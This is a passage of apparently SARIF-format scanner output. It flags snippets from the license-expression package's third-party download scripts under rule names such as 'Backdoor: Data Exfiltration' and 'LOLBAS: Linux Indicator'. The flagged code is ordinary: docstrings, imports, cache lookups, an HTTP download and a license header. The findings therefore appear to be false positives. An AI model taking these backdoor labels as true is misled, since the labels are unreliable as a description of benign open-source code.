          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 106,
                  "startColumn": 52,
                  "endLine": 107,
                  "snippet": {
                    "text": "            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n            - collect requirement deps from wheel metadata and add to queue\n    - if fetched, break, otherwise display error message\n\n\n",
                    "rendered": {
                      "text": "            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n            - collect requirement deps from wheel metadata and add to queue\n    - if fetched, break, otherwise display error message\n\n\n",
                      "markdown": "`            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n            - collect requirement deps from wheel metadata and add to queue\n    - if fetched, break, otherwise display error message\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 105,
                  "startColumn": 33,
                  "endLine": 106,
                  "snippet": {
                    "text": "        - for each environment:\n            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n            - collect requirement deps from wheel metadata and add to queue\n    - if fetched, break, otherwise display error message\n\n",
                    "rendered": {
                      "text": "        - for each environment:\n            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n            - collect requirement deps from wheel metadata and add to queue\n    - if fetched, break, otherwise display error message\n\n",
                      "markdown": "`        - for each environment:\n            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n            - collect requirement deps from wheel metadata and add to queue\n    - if fetched, break, otherwise display error message\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 13,
                  "endLine": 103,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    - for each PyPI simple index:\n        - fetch through cache the PyPI simple index for this package\n        - for each environment:\n            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n",
                    "rendered": {
                      "text": "    - for each PyPI simple index:\n        - fetch through cache the PyPI simple index for this package\n        - for each environment:\n            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n",
                      "markdown": "`    - for each PyPI simple index:\n        - fetch through cache the PyPI simple index for this package\n        - for each environment:\n            - find a wheel matching pinned requirement in this index\n            - if file exist locally, continue\n            - fetch the wheel for env\n                - IF pure, break, no more needed for env\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 86,
                  "startColumn": 64,
                  "endLine": 86,
                  "endColumn": 69,
                  "snippet": {
                    "text": "PypiSimpleRepository and Packages are related through packages name, version and\nfilenames.\n\nThe Wheel models code is partially derived from the mit-licensed pip and the\nDistribution/Wheel/Sdist design has been heavily inspired by the packaging-\ndists library https://github.com/uranusjr/packaging-dists by Tzu-ping Chung\n\"\"\"\n",
                    "rendered": {
                      "text": "PypiSimpleRepository and Packages are related through packages name, version and\nfilenames.\n\nThe Wheel models code is partially derived from the mit-licensed pip and the\nDistribution/Wheel/Sdist design has been heavily inspired by the packaging-\ndists library https://github.com/uranusjr/packaging-dists by Tzu-ping Chung\n\"\"\"\n",
                      "markdown": "`PypiSimpleRepository and Packages are related through packages name, version and\nfilenames.\n\nThe Wheel models code is partially derived from the mit-licensed pip and the\nDistribution/Wheel/Sdist design has been heavily inspired by the packaging-\ndists library https://github.com/uranusjr/packaging-dists by Tzu-ping Chung\n\"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 76,
                  "startColumn": 60,
                  "endLine": 76,
                  "endColumn": 65,
                  "snippet": {
                    "text": "  (e.g., platfiorm and ABI tags.) and is represented by the \"tags\" it supports.\n\n- A plain LinksRepository which is just a collection of URLs scrape from a web\n  page such as HTTP diretory listing. It is used either with pip \"--find-links\"\n  option or to fetch ABOUT and LICENSE files.\n\n- A PypiSimpleRepository is a PyPI \"simple\" index where a HTML page is listing\n",
                    "rendered": {
                      "text": "  (e.g., platfiorm and ABI tags.) and is represented by the \"tags\" it supports.\n\n- A plain LinksRepository which is just a collection of URLs scrape from a web\n  page such as HTTP diretory listing. It is used either with pip \"--find-links\"\n  option or to fetch ABOUT and LICENSE files.\n\n- A PypiSimpleRepository is a PyPI \"simple\" index where a HTML page is listing\n",
                      "markdown": "`  (e.g., platfiorm and ABI tags.) and is represented by the \"tags\" it supports.\n\n- A plain LinksRepository which is just a collection of URLs scrape from a web\n  page such as HTTP diretory listing. It is used either with pip \"--find-links\"\n  option or to fetch ABOUT and LICENSE files.\n\n- A PypiSimpleRepository is a PyPI \"simple\" index where a HTML page is listing\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 48,
                  "startColumn": 8,
                  "endLine": 48,
                  "endColumn": 13,
                  "snippet": {
                    "text": "- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n  production and development\n\n\n",
                    "rendered": {
                      "text": "- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n  production and development\n\n\n",
                      "markdown": "`- create, update and download ABOUT, NOTICE and LICENSE metadata for these\n  wheels and source distributions\n\n- update pip requirement files based on actually installed packages for\n  production and development\n\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 18,
                  "startColumn": 6,
                  "endLine": 19,
                  "snippet": {
                    "text": "import shutil\nimport subprocess\nimport tempfile\nimport time\nimport urllib\nfrom collections import defaultdict\nfrom urllib.parse import quote_plus\n\n",
                    "rendered": {
                      "text": "import shutil\nimport subprocess\nimport tempfile\nimport time\nimport urllib\nfrom collections import defaultdict\nfrom urllib.parse import quote_plus\n\n",
                      "markdown": "`import shutil\nimport subprocess\nimport tempfile\nimport time\nimport urllib\nfrom collections import defaultdict\nfrom urllib.parse import quote_plus\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1953,
                  "startColumn": 19,
                  "endLine": 1953,
                  "endColumn": 24,
                  "snippet": {
                    "text": "    errors. Treats the content as text if as_text is True otherwise as treat as\n    binary.\n    \"\"\"\n    content = CACHE.get(\n        path_or_url=path_or_url,\n        as_text=as_text,\n    )\n",
                    "rendered": {
                      "text": "    errors. Treats the content as text if as_text is True otherwise as treat as\n    binary.\n    \"\"\"\n    content = CACHE.get(\n        path_or_url=path_or_url,\n        as_text=as_text,\n    )\n",
                      "markdown": "`    errors. Treats the content as text if as_text is True otherwise as treat as\n    binary.\n    \"\"\"\n    content = CACHE.get(\n        path_or_url=path_or_url,\n        as_text=as_text,\n    )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1918,
                  "startColumn": 17,
                  "endLine": 1918,
                  "endColumn": 22,
                  "snippet": {
                    "text": "    # several redirects and that we can ignore content there. A HEAD request may\n    # not get us this last header\n    print(f\"    DOWNLOADING: {url}\")\n    with requests.get(url, allow_redirects=True, stream=True, headers=headers) as response:\n        status = response.status_code\n        if status != requests.codes.ok:  # NOQA\n            if status == 429 and _delay < 20:\n",
                    "rendered": {
                      "text": "    # several redirects and that we can ignore content there. A HEAD request may\n    # not get us this last header\n    print(f\"    DOWNLOADING: {url}\")\n    with requests.get(url, allow_redirects=True, stream=True, headers=headers) as response:\n        status = response.status_code\n        if status != requests.codes.ok:  # NOQA\n            if status == 429 and _delay < 20:\n",
                      "markdown": "`    # several redirects and that we can ignore content there. A HEAD request may\n    # not get us this last header\n    print(f\"    DOWNLOADING: {url}\")\n    with requests.get(url, allow_redirects=True, stream=True, headers=headers) as response:\n        status = response.status_code\n        if status != requests.codes.ok:  # NOQA\n            if status == 429 and _delay < 20:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1757,
                  "startColumn": 20,
                  "endLine": 1757,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        if TRACE_DEEP:\n            print(f\"Base URL {base_url}\")\n\n        text = CACHE.get(\n            path_or_url=links_url,\n            as_text=True,\n            force=not self.use_cached_index,\n",
                    "rendered": {
                      "text": "        if TRACE_DEEP:\n            print(f\"Base URL {base_url}\")\n\n        text = CACHE.get(\n            path_or_url=links_url,\n            as_text=True,\n            force=not self.use_cached_index,\n",
                      "markdown": "`        if TRACE_DEEP:\n            print(f\"Base URL {base_url}\")\n\n        text = CACHE.get(\n            path_or_url=links_url,\n            as_text=True,\n            force=not self.use_cached_index,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1690,
                  "startColumn": 20,
                  "endLine": 1690,
                  "endColumn": 25,
                  "snippet": {
                    "text": "        name using the `index_url` of this repository.\n        \"\"\"\n        package_url = f\"{self.index_url}/{normalized_name}\"\n        text = CACHE.get(\n            path_or_url=package_url,\n            as_text=True,\n            force=not self.use_cached_index,\n",
                    "rendered": {
                      "text": "        name using the `index_url` of this repository.\n        \"\"\"\n        package_url = f\"{self.index_url}/{normalized_name}\"\n        text = CACHE.get(\n            path_or_url=package_url,\n            as_text=True,\n            force=not self.use_cached_index,\n",
                      "markdown": "`        name using the `index_url` of this repository.\n        \"\"\"\n        package_url = f\"{self.index_url}/{normalized_name}\"\n        text = CACHE.get(\n            path_or_url=package_url,\n            as_text=True,\n            force=not self.use_cached_index,\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1682,
                  "startColumn": 55,
                  "endLine": 1682,
                  "endColumn": 60,
                  "snippet": {
                    "text": "            # return the latest version\n            return versions and versions[-1]\n        else:\n            return self._get_package_versions_map(name).get(version)\n\n    def fetch_links(self, normalized_name):\n        \"\"\"\n",
                    "rendered": {
                      "text": "            # return the latest version\n            return versions and versions[-1]\n        else:\n            return self._get_package_versions_map(name).get(version)\n\n    def fetch_links(self, normalized_name):\n        \"\"\"\n",
                      "markdown": "`            # return the latest version\n            return versions and versions[-1]\n        else:\n            return self._get_package_versions_map(name).get(version)\n\n    def fetch_links(self, normalized_name):\n        \"\"\"\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 953,
                  "startColumn": 26,
                  "endLine": 953,
                  "endColumn": 31,
                  "snippet": {
                    "text": "        Return True if any data was updated, False otherwise. Raise an exception\n        if there are key data conflicts.\n        \"\"\"\n        package_url = data.get(\"package_url\")\n        if package_url:\n            purl_from_data = packageurl.PackageURL.from_string(package_url)\n            purl_from_self = packageurl.PackageURL.from_string(self.package_url)\n",
                    "rendered": {
                      "text": "        Return True if any data was updated, False otherwise. Raise an exception\n        if there are key data conflicts.\n        \"\"\"\n        package_url = data.get(\"package_url\")\n        if package_url:\n            purl_from_data = packageurl.PackageURL.from_string(package_url)\n            purl_from_self = packageurl.PackageURL.from_string(self.package_url)\n",
                      "markdown": "`        Return True if any data was updated, False otherwise. Raise an exception\n        if there are key data conflicts.\n        \"\"\"\n        package_url = data.get(\"package_url\")\n        if package_url:\n            purl_from_data = packageurl.PackageURL.from_string(package_url)\n            purl_from_self = packageurl.PackageURL.from_string(self.package_url)\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 827,
                  "startColumn": 43,
                  "endLine": 827,
                  "endColumn": 48,
                  "snippet": {
                    "text": "        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n        for filename in lic_names + extra_lic_names:\n",
                    "rendered": {
                      "text": "        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n        for filename in lic_names + extra_lic_names:\n",
                      "markdown": "`        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n        for filename in lic_names + extra_lic_names:\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 826,
                  "startColumn": 65,
                  "endLine": 826,
                  "endColumn": 70,
                  "snippet": {
                    "text": "        \"\"\"\n        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n",
                    "rendered": {
                      "text": "        \"\"\"\n        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n",
                      "markdown": "`        \"\"\"\n        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 826,
                  "startColumn": 28,
                  "endLine": 826,
                  "endColumn": 33,
                  "snippet": {
                    "text": "        \"\"\"\n        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n",
                    "rendered": {
                      "text": "        \"\"\"\n        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n",
                      "markdown": "`        \"\"\"\n        urls = LinksRepository.from_url(use_cached_index=use_cached_index).links\n        errors = []\n        extra_lic_names = [l.get(\"file\") for l in self.extra_data.get(\"licenses\", {})]\n        extra_lic_names += [self.extra_data.get(\"license_file\")]\n        extra_lic_names = [ln for ln in extra_lic_names if ln]\n        lic_names = [f\"{key}.LICENSE\" for key in self.get_license_keys()]\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 803,
                  "startColumn": 32,
                  "endLine": 803,
                  "endColumn": 37,
                  "snippet": {
                    "text": "        real_checksums = self.get_checksums(dest_dir)\n        for csk in (\"md5\", \"sha1\", \"sha256\"):\n            csv = getattr(self, csk)\n            rcv = real_checksums.get(csk)\n            if csv and rcv and csv != rcv:\n                return False\n        return True\n",
                    "rendered": {
                      "text": "        real_checksums = self.get_checksums(dest_dir)\n        for csk in (\"md5\", \"sha1\", \"sha256\"):\n            csv = getattr(self, csk)\n            rcv = real_checksums.get(csk)\n            if csv and rcv and csv != rcv:\n                return False\n        return True\n",
                      "markdown": "`        real_checksums = self.get_checksums(dest_dir)\n        for csk in (\"md5\", \"sha1\", \"sha256\"):\n            csv = getattr(self, csk)\n            rcv = real_checksums.get(csk)\n            if csv and rcv and csv != rcv:\n                return False\n        return True\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 768,
                  "startColumn": 35,
                  "endLine": 768,
                  "endColumn": 40,
                  "snippet": {
                    "text": "        notice_file = about_data.pop(\"notice_file\", None)\n        if notice_file:\n            try:\n                notice_text = CACHE.get(\n                    path_or_url=self.notice_download_url,\n                    as_text=True,\n                )\n",
                    "rendered": {
                      "text": "        notice_file = about_data.pop(\"notice_file\", None)\n        if notice_file:\n            try:\n                notice_text = CACHE.get(\n                    path_or_url=self.notice_download_url,\n                    as_text=True,\n                )\n",
                      "markdown": "`        notice_file = about_data.pop(\"notice_file\", None)\n        if notice_file:\n            try:\n                notice_text = CACHE.get(\n                    path_or_url=self.notice_download_url,\n                    as_text=True,\n                )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000700"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration",
            "id": "BD000700"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 754,
                  "startColumn": 30,
                  "endLine": 754,
                  "endColumn": 35,
                  "snippet": {
                    "text": "        NOTICE file if any. Return True if the data was updated.\n        \"\"\"\n        try:\n            about_text = CACHE.get(\n                path_or_url=self.about_download_url,\n                as_text=True,\n            )\n",
                    "rendered": {
                      "text": "        NOTICE file if any. Return True if the data was updated.\n        \"\"\"\n        try:\n            about_text = CACHE.get(\n                path_or_url=self.about_download_url,\n                as_text=True,\n            )\n",
                      "markdown": "`        NOTICE file if any. Return True if the data was updated.\n        \"\"\"\n        try:\n            about_text = CACHE.get(\n                path_or_url=self.about_download_url,\n                as_text=True,\n            )\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 2193,
                  "startColumn": 16,
                  "endLine": 2193,
                  "endColumn": 31,
                  "snippet": {
                    "text": "    ]\n\n    if environment:\n        eopts = environment.get_pip_cli_options()\n        cli_args.extend(eopts)\n    else:\n        print(\"WARNING: no download environment provided.\")\n",
                    "rendered": {
                      "text": "    ]\n\n    if environment:\n        eopts = environment.get_pip_cli_options()\n        cli_args.extend(eopts)\n    else:\n        print(\"WARNING: no download environment provided.\")\n",
                      "markdown": "`    ]\n\n    if environment:\n        eopts = environment.get_pip_cli_options()\n        cli_args.extend(eopts)\n    else:\n        print(\"WARNING: no download environment provided.\")\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_thirdparty.py"
                },
                "region": {
                  "startLine": 1504,
                  "startColumn": 7,
                  "endLine": 1504,
                  "endColumn": 37,
                  "snippet": {
                    "text": "@attr.attributes\nclass Environment:\n    \"\"\"\n    An Environment describes a target installation environment with its\n    supported Python version, ABI, platform, implementation and related\n    attributes.\n\n",
                    "rendered": {
                      "text": "@attr.attributes\nclass Environment:\n    \"\"\"\n    An Environment describes a target installation environment with its\n    supported Python version, ABI, platform, implementation and related\n    attributes.\n\n",
                      "markdown": "`@attr.attributes\nclass Environment:\n    \"\"\"\n    An Environment describes a target installation environment with its\n    supported Python version, ABI, platform, implementation and related\n    attributes.\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_pypi_supported_tags.py"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 38,
                  "endLine": 4,
                  "snippet": {
                    "text": "# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n# http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/license-expression.zip/etc/scripts/utils_pip_compatibility_tags.py"
                },
                "region": {
                  "startLine": 6,
                  "startColumn": 27,
                  "endLine": 6,
                  "endColumn": 32,
                  "snippet": {
